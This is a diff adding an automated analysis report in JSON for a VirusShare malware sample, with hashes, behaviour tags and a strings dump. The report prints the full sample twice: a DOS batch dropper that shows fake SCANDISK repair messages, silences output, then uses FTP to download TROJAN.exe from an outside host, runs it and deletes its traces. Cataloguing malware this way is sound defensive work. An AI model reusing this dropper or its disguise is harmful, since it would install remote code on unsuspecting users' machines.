@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "binary": "May read or write a binary file",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\necho MS-DOS SCANDISK\necho found 27,4951 lost bytes\necho fixing error(s)...\nctty nul\necho user USERNAME >>c:\\$.tmp\necho PASSWORD >>c:\\$.tmp\necho lcd c:\\windows >>c:\\$.tmp\necho binary >>c:\\$.tmp\necho get TROJAN.exe >>c:\\$.tmp\necho quit >>c:\\$.tmp\nftp -v -i -n -s:c:\\$.tmp ftp.xoom.com\nTROJAN.exe\ndel c:\\$.tmp\nctty con\necho lost cluster(s) fixed"
+    },
+    "filename": "VirusShare_f5aa25d60882d5c15ede0600c7f243a8",
+    "filesize": 369,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "f5aa25d60882d5c15ede0600c7f243a8",
+        "sha1": "2124aa9efdd175adf785f635403096dc8544521f",
+        "sha256": "4d8dfa3bc59dc3cd8be910f99cd54be596cbda2de9410577aeca5ff450f1deab"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "echo MS-DOS SCANDISK",
+            "echo found 27,4951 lost bytes",
+            "echo fixing error(s)...",
+            "ctty nul",
+            "echo user USERNAME >>c:\\$.tmp",
+            "echo PASSWORD >>c:\\$.tmp",
+            "echo lcd c:\\windows >>c:\\$.tmp",
+            "echo binary >>c:\\$.tmp",
+            "echo get TROJAN.exe >>c:\\$.tmp",
+            "echo quit >>c:\\$.tmp",
+            "ftp -v -i -n -s:c:\\$.tmp ftp.xoom.com",
+            "TROJAN.exe",
+            "del c:\\$.tmp",
+            "ctty con",
+            "echo lost cluster(s) fixed"
+        ],
+        "file": {
+            "TROJAN.exe": "Executable",
+            "del c:\\$.tmp": "Temporary",
+            "echo PASSWORD >>c:\\$.tmp": "Temporary",
+            "echo binary >>c:\\$.tmp": "Temporary",
+            "echo get TROJAN.exe >>c:\\$.tmp": "Temporary",
+            "echo lcd c:\\windows >>c:\\$.tmp": "Temporary",
+            "echo quit >>c:\\$.tmp": "Temporary",
+            "echo user USERNAME >>c:\\$.tmp": "Temporary"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.314590",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
